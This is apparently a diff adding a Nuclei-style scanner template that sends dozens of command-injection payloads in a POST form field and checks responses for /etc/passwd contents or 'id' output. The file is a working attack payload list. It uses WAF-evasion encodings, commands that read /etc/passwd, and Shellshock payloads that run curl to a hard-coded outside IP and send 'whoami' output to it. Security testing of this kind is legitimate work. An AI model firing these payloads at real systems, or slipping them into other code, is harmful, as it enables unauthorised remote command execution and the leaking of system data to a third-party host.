@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "cat%20/etc/passwd"
+        - "%27%0Awhoami%0A%27"
+        - "||{cat,/etc/passwd}"
+        - "%60cat%20%2Fetc%24u%2Fpasswd%60"
+        - "&echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "a);id|"
+        - "||id|"
+        - "||id"
+        - "& echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "%7Cid"
+        - "%2Cid"
+        - "%7Cid"
+        - "cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%26id"
+        - "%24%28cat%2520%2Fetc%2Fpasswd%29"
+        - "a)|id;"
+        - ";system('cat%20/etc/passwd')"
+        - ";cat /etc/passwd"
+        - "%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60"
+        - ";cat+/etc/passwd+#"
+        - "%24%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "%27cat%20%2Fetc%24u%2Fpasswd%29"
+        - "||cat /e${hahaha}tc/${heywaf}pas${catchthis}swd"
+        - ";system('cat%20/etc/passwd')"
+        - "a;id|"
+        - "%2Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "||id"
+        - "a;id"
+        - "&&cat$IFS/etc/passwd"
+        - "&&cat /etc/passwd"
+        - "%24%28cat%24IFS%2Fetc%2Fpasswd%29"
+        - "; `id`"
+        - "||cat</etc/passwd"
+        - "%27%20id"
+        - "%27id%27"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=25?user=\\`whoami\\`\""
+        - "%60id%60"
+        - "&&cat%20/etc/passwd"
+        - "a)|id;"
+        - "; `id` #"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?user=\\`whoami\\`\""
+        - "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=7\""
+        - ";id|"
+        - "cat$u /etc$u/passwd"
+        - "cat%24IFS%2Fetc%2Fpasswd"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "a);id|"
+        - "%2Cid"
+        - "|id"
+        - "cat$IFS/etc/passwd"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
